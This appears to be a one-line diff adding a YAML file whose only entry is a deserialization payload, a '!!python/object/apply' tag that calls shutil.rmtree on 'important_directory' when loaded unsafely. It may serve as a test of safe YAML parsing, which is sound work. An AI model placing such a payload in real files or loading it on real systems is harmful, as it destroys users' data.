@@ -1,0 +1,1 @@
+a: !!python/object/apply:shutil.rmtree ['important_directory']
